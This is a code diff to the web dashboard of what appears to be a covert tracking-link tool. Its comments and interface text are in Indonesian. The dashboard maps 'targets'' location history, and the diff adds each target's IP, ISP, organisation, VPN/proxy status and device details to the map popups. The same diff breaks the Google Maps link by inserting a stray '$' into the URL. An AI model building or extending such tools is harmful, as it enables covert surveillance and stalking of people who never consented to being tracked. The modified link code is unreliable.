@@ -103,7 +103,6 @@
         function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff0041', '#41aaff', '#ffaa00', '#888888'] }] }, options: { plugins: { legend: { labels: { color: '#00ff41' } } } } }) }
         async function deleteLink(e, o) { if (confirm(`Anda yakin ingin menghapus link untuk target '${o}' (${e})?\n\nSemua data lokasi terkait juga akan dihapus permanen!`)) try { const o = await fetch(`/api/links/${e}`, { method: 'DELETE' }); if ("success" !== (await o.json()).status) throw new Error('Gagal menghapus link.') } catch (e) { alert(`Error: ${e.message}`) } }
         
-        // !!! FUNGSI showMapModal DIPERBARUI DENGAN LINK GOOGLE MAPS YANG BENAR !!!
         async function showMapModal(id, name) {
             modal.style.display = "block";
             modalTitle.textContent = `> Location History for: ${name}`;
@@ -124,17 +123,23 @@
                     locations.forEach(loc => {
                         const marker = L.marker([loc.latitude, loc.longitude]);
                         const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
+                        
+                        // [START] Kode Popup yang Diperbarui
                         marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br>
-                            <strong>${locationString}</strong><br>
-                            IP: ${loc.ip_address}<br>
-                            ${loc.browser} on ${loc.os}<br>
-                            ${loc.device.type} - ${loc.device.vendor} ${loc.device.model}`);
+                            <strong>${locationString}</strong><br><br>
+                            <strong>IP:</strong> ${loc.ip_address}<br>
+                            <strong>ISP:</strong> ${loc.isp || 'N/A'}<br>
+                            <strong>Organisasi:</strong> ${loc.org || 'N/A'}<br>
+                            <strong>Proxy/VPN:</strong> ${loc.proxy ? '<span class="error">Yes</span>' : 'No'}<br><br>
+                            <strong>Device:</strong> ${loc.browser} on ${loc.os}<br>
+                            (${loc.device.type} - ${loc.device.vendor} ${loc.device.model})`);
+                        // [END] Kode Popup yang Diperbarui
+                            
                         markersLayer.addLayer(marker);
                     });
                     
                     const latestLocation = locations[0];
-                    // Ini adalah format link Google Maps yang benar dan lebih akurat
-                    const googleMapsUrl = `https://www.google.com/maps?q=${latestLocation.latitude},${latestLocation.longitude}`;
+                    const googleMapsUrl = `https://www.google.com/maps?q=$${latestLocation.latitude},${latestLocation.longitude}`;
                     mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ LIHAT LEBIH DETAIL DI GOOGLE MAPS ]</a>`;
 
                     map.fitBounds(markersLayer.getBounds());
